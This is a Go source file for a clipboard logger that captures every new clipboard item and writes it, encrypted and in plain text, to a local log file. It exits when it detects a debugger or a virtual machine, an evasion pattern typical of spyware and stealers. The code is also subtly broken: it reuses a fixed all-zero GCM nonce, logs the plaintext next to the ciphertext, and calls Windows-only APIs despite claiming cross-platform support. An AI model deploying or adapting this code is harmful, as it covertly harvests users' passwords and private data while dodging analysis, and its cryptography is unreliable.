package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	Logging            = true
	EncryptionKey      = "your_secret_encryption_key"
	EnableClipboard    = true
	CheckInterval      = 2 * time.Second
)

func main() {
	if isBeingDebugged() || isRunningInVM() {
		logMessage("Debugger or VM detected. Exiting.")
		os.Exit(1)
	}

	if EnableClipboard {
		var previousContent string
		for {
			content, err := readClipboard()
			if err != nil {
				logMessage(fmt.Sprintf("Clipboard error: %v", err))
				time.Sleep(CheckInterval)
				continue
			}

			if content != "" && content != previousContent {
				encryptedContent := encrypt(content, EncryptionKey)
				logMessage(fmt.Sprintf("Encrypted Clipboard content: %s", encryptedContent))

				decryptedContent := decrypt(encryptedContent, EncryptionKey)
				logMessage(fmt.Sprintf("Decrypted Clipboard content: %s", decryptedContent))

				previousContent = content
			}

			time.Sleep(CheckInterval)
		}
	}
}

func readClipboard() (string, error) {
	switch runtime.GOOS {
	case "windows":
		return readClipboardWindows()
	case "linux":
		return readClipboardUnix("xclip", "-selection", "clipboard", "-o")
	case "darwin":
		return readClipboardUnix("pbpaste")
	default:
		return "", fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func readClipboardWindows() (string, error) {
	user32 := syscall.NewLazyDLL("user32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	openClipboard := user32.NewProc("OpenClipboard")
	getClipboardData := user32.NewProc("GetClipboardData")
	closeClipboard := user32.NewProc("CloseClipboard")
	globalLock := kernel32.NewProc("GlobalLock")
	globalUnlock := kernel32.NewProc("GlobalUnlock")

	if _, _, err := openClipboard.Call(0); err != nil && err.Error() != "The operation completed successfully." {
		return "", fmt.Errorf("failed to open clipboard: %v", err)
	}
	defer closeClipboard.Call()

	cfText := uintptr(1)
	h, _, err := getClipboardData.Call(cfText)
	if h == 0 {
		return "", fmt.Errorf("failed to get clipboard data: %v", err)
	}

	ptr, _, err := globalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("failed to lock global memory: %v", err)
	}
	defer globalUnlock.Call(h)

	var text strings.Builder
	for {
		c := *(*byte)(unsafe.Pointer(ptr))
		if c == 0 {
			break
		}
		text.WriteByte(c)
		ptr++
	}

	return text.String(), nil
}

func readClipboardUnix(cmdName string, args ...string) (string, error) {
	cmd := exec.Command(cmdName, args...)
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to read clipboard: %v", err)
	}
	return string(output), nil
}

func encrypt(plainText, key string) string {
	block, err := aes.NewCipher([]byte(createHash(key)))
	if err != nil {
		fmt.Println("Failed to create cipher block:", err)
		return ""
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Failed to create GCM:", err)
		return ""
	}
	nonce := make([]byte, gcm.NonceSize())
	cipherText := gcm.Seal(nonce, nonce, []byte(plainText), nil)
	return base64.StdEncoding.EncodeToString(cipherText)
}

func decrypt(cipherText, key string) string {
	data, err := base64.StdEncoding.DecodeString(cipherText)
	if err != nil {
		fmt.Println("Failed to decode base64 string:", err)
		return ""
	}

	block, err := aes.NewCipher([]byte(createHash(key)))
	if err != nil {
		fmt.Println("Failed to create cipher block:", err)
		return ""
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Failed to create GCM:", err)
		return ""
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		fmt.Println("Ciphertext too short")
		return ""
	}

	nonce, cipherTextBytes := data[:nonceSize], data[nonceSize:]
	plainText, err := gcm.Open(nil, nonce, cipherTextBytes, nil)
	if err != nil {
		fmt.Println("Failed to decrypt:", err)
		return ""
	}
	return string(plainText)
}

func createHash(key string) string {
	hasher := sha256.New()
	hasher.Write([]byte(key))
	return fmt.Sprintf("%x", hasher.Sum(nil))[:32]
}

func logMessage(message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)
	fmt.Print(logEntry)

	if Logging {
		logFile := "tool_log.txt"
		f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("Failed to write to log file: %v\n", err)
			return
		}
		defer f.Close()

		if _, err := f.WriteString(logEntry); err != nil {
			fmt.Printf("Failed to write log entry: %v\n", err)
		}
	}
}

func isBeingDebugged() bool {
	var isDebuggerPresent bool
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
	return ret != 0
}

func isRunningInVM() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	vmIndicators := []string{
		"VMware",
		"VirtualBox",
		"QEMU",
		"Hyper-V",
		"KVM",
		"Xen",
	}

	for _, indicator := range vmIndicators {
		if isIndicatorPresent(indicator) {
			return true
		}
	}
	return false
}

func isIndicatorPresent(indicator string) bool {
	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), indicator)
}
